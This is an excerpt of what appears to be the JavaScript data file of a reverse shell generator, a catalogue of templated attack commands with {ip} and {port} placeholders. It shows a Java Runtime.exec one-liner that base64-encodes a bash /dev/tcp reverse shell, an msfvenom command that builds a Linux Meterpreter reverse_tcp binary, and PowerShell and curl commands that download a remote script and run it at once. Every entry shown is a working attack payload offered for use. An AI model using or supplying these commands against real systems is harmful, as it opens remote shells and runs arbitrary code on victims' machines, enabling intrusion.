...
const reverseShellCommands = withCommandType(
    ...
    [
        ...
        },
        {
            ...
            "name": "Java #4",
            "command": 'Runtime.getRuntime().exec("{shell} -c {echo,`echo \"/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1\"|base64 `}|{base64,-d}|{bash,-i}");',
            "meta": ["linux", "mac"]
        },
        {
            "name": "Java Web",
...
const msfvenomCommands = withCommandType(
    ...
    [
        ...
        {
            "name": "Linux Meterpreter Staged Prepend Fork (x64)",
            "command": "msfvenom -p linux/x64/meterpreter/reverse_tcp prependfork=true LHOST={ip} LPORT={port}  -f elf -o reverse.elf",
            "meta": ["msfvenom", "linux", "staged", "meterpreter", "reverse"]
        },
        {
...
const rsgData = {
    ...
    specialCommands: {
        ...
        "Powershell DownloadString": "IEX (New-Object System.Net.WebClient).DownloadString('http://{ip}:{port}/yourscript.ps1');",
        "Download and execute": "curl http://{ip}:{port}/yourscript.sh | {shell} - ",
        "Download and execute (base64)": "curl http://{ip}:{port}/yourscript.sh | base64 -d | {shell} - ",
    },
